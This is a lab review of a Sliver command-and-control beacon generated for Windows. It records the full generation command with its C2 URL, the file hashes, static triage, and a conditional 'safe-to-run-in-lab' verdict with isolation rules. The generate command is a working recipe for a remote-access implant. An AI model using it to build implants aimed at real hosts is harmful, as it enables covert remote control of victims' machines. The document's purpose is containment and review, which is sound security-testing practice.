# Generated Windows named-HTTPS beacon review

- Generator: official Sliver v1.7.3 server, commit
  `3bbaf805104dcc4a75414ee0084e8de50702cad4`
- Generation command: `generate beacon --http
  "https://c2.sliver.lab:18443?driver=wininet&no-fallback=true" --os windows
  --arch amd64 --format exe --name WIN-NAMED-HTTPS --seconds 10 --jitter 3`
- Size: 37,604,352 bytes
- SHA-256:
  `1f55cb6f0240a5919ed80d8a5849cacdd5a2049f627498c27d32bddf3e5534a4`
- Configured runtime destination:
  `https://c2.sliver.lab:18443?driver=wininet&no-fallback=true`

## Mechanical triage

The adjacent `poc-review.json` is fresh `safety/poc-triage.py` output produced
on static-analysis VM 110 before execution. It returned
`NEEDS-HUMAN-REVIEW` solely because this is a 37 MB compiled PE with measured
entropy 6.14. It did not report a hard-coded public endpoint, credential-file
access string, install hook, persistence command, destructive command, or
second-stage download expression. A scanner result is not clearance.

## Static and source-correspondence review

VM 110 received the PE from Kali `192.168.1.50` for static analysis only. The
Kali generation artifact and VM 110 copy hashes matched. `file` identified a
PE32+ x86-64 Windows GUI executable with eight conventional Go PE sections;
`objdump` showed only `kernel32.dll` in the static import table. The file was
never launched, loaded, emulated, or submitted to an external service on VM
110.

The generated source retained by the isolated Sliver server was read without
execution. Its transport generator contains one endpoint only:
`https://c2.sliver.lab:18443?driver=wininet&no-fallback=true`; there is no
alternate URI. The WinINet driver source and server HTTPS certificate path are
covered by the parent `poc-review.md`. String extraction did not reveal the
obfuscated endpoint, which is expected after Sliver's default garbling and is
why generated-source correspondence, exclusive lab DNS, `no-fallback=true`,
and the preventive egress guard are required.

## Verdict

**`safe-to-run-in-lab`**, only on Windows VM 104 after rollback to
`win_verify_baseline`, with `c2.sliver.lab` resolved exclusively by Kali
`192.168.1.50`, target/Kali egress restricted to loopback and
`192.168.1.0/24`, full packet capture active, and exact hash verification after
delivery. The only permitted HTTPS destination is `192.168.1.50:18443`. No
execution is permitted on VM 102, VM 108, VM 109, VM 110, or any other host.
